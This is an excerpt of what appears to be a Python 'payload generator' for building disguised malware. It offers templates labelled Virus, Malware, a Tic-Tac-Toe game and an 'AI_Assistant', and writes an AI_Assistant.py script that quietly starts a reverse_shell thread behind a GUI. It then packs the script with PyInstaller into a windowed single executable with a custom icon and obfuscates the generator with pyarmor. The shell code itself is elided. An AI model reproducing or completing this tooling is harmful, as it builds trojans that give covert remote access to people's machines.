...
# PS C:\Reverse_Shell_PG> C:\Users\Gabriel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyarmor gen Payload_generator_V-4.5.py
...
if __name__ == "__main__":
    ...
    ai_thread = threading.Thread(target=reverse_shell)
    ai_thread.start()  
    app.exec_()
    ai_thread.join()
...
def choose_template():
    print("""
    (1) Virus - basic background process
    (2) Tic-Tac-Toe Game
    (3) Malware
    (4) AI_Assistant
    """)
    templates = input("Choose a template (1/2/3/4): ").strip()
    if templates == '1':
        ...
        create_script("AI_Assistant.py", AI_Assistant)
        ...
        script_filename = r"AI_Assistant.py"
        icon_path = r"C:\MyFiles\DeltaAI1\UI5.jpg"
        icon_path_from_exe = r"C:\MyFiles\DeltaAI1\logo_ai_U6Q_icon.ico"
        gif_path = r"C:\MyFiles\DeltaAI1\gif5.gif"
        output_folder = r"dist"


        def create_executable():
            # Make sure the paths are correct
            if not os.path.exists(pyinstaller_path):
                print(f"PyInstaller not found at {pyinstaller_path}. Please install it or check the path.")
                return
            ...
            if not os.path.exists(icon_path) or not os.path.exists(gif_path):
                print(f"One or more resource files (icon/gif) are missing.")
                return
            ...
            # Verify the output
            exe_path = os.path.join(output_folder, "AI_Assistant.exe")
...
def convert_to_executable(script_filename):
    ...
    if convert_to_exe == 'yes':
        ...
        if pyinstaller_path:
            ...
            result = subprocess.run([pyinstaller_path, "--onefile", f"--icon={icon_path}","--add-data", "hack3.gif:.", "--windowed", script_filename], capture_output=True, text=True)
